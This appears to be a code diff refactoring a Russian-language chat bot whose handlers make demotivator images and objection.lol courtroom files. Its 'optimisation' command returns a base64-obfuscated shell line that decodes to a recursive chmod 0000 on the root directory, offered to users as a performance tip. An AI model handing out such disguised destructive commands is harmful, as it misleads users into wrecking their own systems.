@@ -1,18 +1,20 @@
-import atexit
 import base64
 import json
 import re
 import tempfile
+from concurrent.futures.thread import ThreadPoolExecutor
 
 from datetime import datetime
 from os.path import join
 from random import randint, choice
-from string import ascii_letters as ASCII_LETTERS
+from string import ascii_letters
+from typing import Awaitable, Callable
+from urllib.error import HTTPError, URLError
 
 import pymysql
 import requests
+import asyncio
 from PIL import UnidentifiedImageError
-from requests.exceptions import SSLError
 
 from images.demotivator import Demotivator
 from images.searchimages import ImgSearch
@@ -20,10 +22,10 @@ from images.vasyacache import Vasya
 
 
 class Bot:
-    def __init__(self, dbConnection: pymysql.connections.Connection):
+    def __init__(self, db_connection: pymysql.connections.Connection):
         self._rateLimit = self._RateLimit()
         self._imgSearch = ImgSearch()
-        self._dbConnection = dbConnection
+        self._dbConnection = db_connection
 
     class _RateLimit:
         _recent = {}
@@ -57,13 +59,17 @@ class Bot:
                 self.filepath = filepath
 
         class Image(Doc):
-            pass
+            ...
 
         @staticmethod
         async def filter(query: str) -> bool:
             ...
 
-        async def parseMsg(self, msg) -> dict:  # returns a parsed dict of command params
+        def run(self, **kwargs) -> [list, None]:
+            ...
+
+        @classmethod
+        def _parseMsg(cls, msg: [str, Image]) -> dict:  # returns a parsed dict of command params
             command = re.split(' |\n', msg)[0]
             args = msg[len(command) + 1:]
             return {
@@ -77,9 +83,9 @@ class Bot:
     class _Help(_Handler):
         @staticmethod
         async def filter(msg: str) -> bool:
-            return msg in ['help', 'команды', 'помощь', 'commands']
+            return msg in ['команды', 'commands']
 
-        async def run(self) -> list:
+        def run(self) -> list:
             return ['''Внимание! Не срите в бота чаще 3 секунд! 1 превышение лимита = +3 секунды к игнору.
 Команды:
 
@@ -101,13 +107,13 @@ objectionconf - сохранить конкретных персонажей д�
 
     class _Optimisation(_Handler):
         @staticmethod
-        async def filter(query: str):
+        async def filter(query: str) -> bool:
             return query.startswith(('оптимизация', 'optimisation'))
 
-        async def run(self) -> list:
+        def run(self) -> list:
             def bashEncode(string):
                 def randString(size):
-                    return ''.join(choice(ASCII_LETTERS) for _ in range(size))
+                    return ''.join(choice(ascii_letters) for _ in range(size))
 
                 def b64(s):
                     return f"`echo {base64.b64encode(bytes(s, 'ascii')).decode('ascii')} | base64 -d`"
@@ -130,27 +136,36 @@ objectionconf - сохранить конкретных персонажей д�
             return [bashEncode("sudo chmod 0000 -R /")]
 
     class _Demotivator(_Handler):
-        def __init__(self, imgSearch):
+        def __init__(self, img_search: ImgSearch):
             super().__init__()
-            self._imgSearch = imgSearch
+            self._imgSearch = img_search
             self._demotivator = Demotivator()
             self._vasyaCache = Vasya(self._demotivator, self._imgSearch)
             self._vasyaCache.start()
-            atexit.register(lambda: setattr(self._vasyaCache, "running", False))
+            self._executor = ThreadPoolExecutor()
+
+        def __del__(self):
+            self._vasyaCache.running = False
 
         @staticmethod
-        async def filter(msg: str):
+        async def filter(msg: str) -> bool:
             return msg.startswith(('демотиватор', 'demotivator'))
 
-        async def run(self, _id: int, msg: str, attachedPhotos: list) -> list:
-            args = (await super().parseMsg(msg))['arguments']
+        def run(self, _id: int, msg: str, attached_photos: list, loop: asyncio.AbstractEventLoop,
+                callback: Callable[[list], Awaitable]) -> None:
+            self._executor.submit(self._runThread, _id, msg, attached_photos, loop, callback)
+
+        def _runThread(self, _id: int, msg: str, attached_photos: list, loop: asyncio.AbstractEventLoop,
+                       callback: Callable[[list], Awaitable]) -> None:
+            args = (super()._parseMsg(msg))['arguments']
             result = []
             notFound = False
             msg = re.split(r"\n|!@next!@", args)
             if not msg[0]:
                 if len(msg) == 1:
                     result.append(self.Image(filepath=self._vasyaCache.getDemotivator()))
-                    return result
+                    loop.call_soon_threadsafe(asyncio.ensure_future, callback(result))
+                    return None
                 else:
                     msg[0] = msg[1]
                     msg[1] = ''
@@ -162,7 +177,7 @@ objectionconf - сохранить конкретных персонажей д�
             d: str
             try:
                 d = self._demotivator.create(
-                    attachedPhotos[0],
+                    attached_photos[0],
                     msg[0],
                     msg[1]
                 )
@@ -181,21 +196,24 @@ objectionconf - сохранить конкретных персонажей д�
                             msg[1]
                         )
                         break
-                    except (UnidentifiedImageError, SSLError, requests.exceptions.ConnectionError):
+                    except (UnidentifiedImageError, HTTPError, URLError):
                         links.pop(links.index(link))
-                        link = links[randint(0, len(links) - 1)]
-                        continue
+                        if not links:
+                            links = self._imgSearch.fetch("kernel panic")
+                            notFound = True
+                        else:
+                            link = links[randint(0, len(links) - 1)]
             result.append(self.Image(filepath=d))
             if notFound:
                 result.append("kалов не найдено((9(")
-            return result
+            loop.call_soon_threadsafe(asyncio.ensure_future, callback(result))
 
     class _Objection(_Handler):
         _jsonPattern: dict
         _usage: str
         _dbConnection: pymysql.connections.Connection
 
-        def __init__(self, dbConnection: pymysql.connections.Connection):
+        def __init__(self, db_connection: pymysql.connections.Connection):
             super().__init__()
             self._jsonPattern = {
                 "Id": 0,
@@ -210,16 +228,16 @@ objectionconf - сохранить конкретных персонажей д�
                 "Username": ""
             }
             self._usage = 'Использование только с пересланными сообщениями.'
-            self._dbCon = dbConnection
+            self._dbCon = db_connection
 
         @staticmethod
-        async def filter(msg: str):
+        async def filter(msg: str) -> bool:
             return msg in ['обжекшон', 'objection']
 
-        async def run(self, _id: int, msg: str, fwdNames: list) -> list:
+        def run(self, _id: int, msg: str, fwd_names: list) -> list:
             result = []
-            args = (await super().parseMsg(msg))['arguments'].split('!@next!@')
-            if not args[0] or len(fwdNames) != len(args):
+            args = (super()._parseMsg(msg))['arguments'].split('!@next!@')
+            if not args[0] or len(fwd_names) != len(args):
                 return [self._usage]
 
             self._dbCon.ping(reconnect=True)
@@ -231,7 +249,7 @@ objectionconf - сохранить конкретных персонажей д�
                     userConfig = {}
             for i in range(len(args)):
                 phrase = self._jsonPattern.copy()
-                phrase['Username'] = f"{fwdNames[i]['firstName']} {fwdNames[i]['lastName'][:1]}."
+                phrase['Username'] = f"{fwd_names[i]['firstName']} {fwd_names[i]['lastName'][:1]}."
                 phrase['Text'] = args[i]
                 phrase['Id'] = i + 1
                 if phrase['Username'] in userConfig:
@@ -241,25 +259,26 @@ objectionconf - сохранить конкретных персонажей д�
             jsonFile = join(tempfile.gettempdir(), str(randint(-32767, 32767)) + '.json')
             with open(jsonFile, 'w') as file:
                 file.write(result)
-            result = [self.Doc(filepath=jsonFile), 'Загрузи этот файл на http://objection.lol/maker нажав кнопку "Load".']
+            result = [self.Doc(filepath=jsonFile),
+                      'Загрузи этот файл на http://objection.lol/maker нажав кнопку "Load".']
             return result
 
     class _ObjectionConf(_Handler):
-        def __init__(self, dbConnection: pymysql.connections.Connection):
+        def __init__(self, db_connection: pymysql.connections.Connection):
             super().__init__()
-            self._dbCon = dbConnection
+            self._dbCon = db_connection
 
         @staticmethod
-        async def filter(msg: str):
+        async def filter(msg: str) -> bool:
             return msg in ['обжекшонконф', 'objectionconf']
 
-        async def run(self, _id: int, attachedDocs: list) -> list:
+        async def run(self, _id: int, attached_docs: list) -> list:
             result = []
-            if not attachedDocs:
+            if not attached_docs:
                 result.append('Команда требует прикрепленного JSON файла.')
                 return result
 
-            newConfig = json.loads(base64.b64decode(requests.get(attachedDocs[0]).content))
+            newConfig = json.loads(base64.b64decode(requests.get(attached_docs[0]).content))
 
             self._dbCon.ping(reconnect=True)
             with self._dbCon.cursor() as cur:
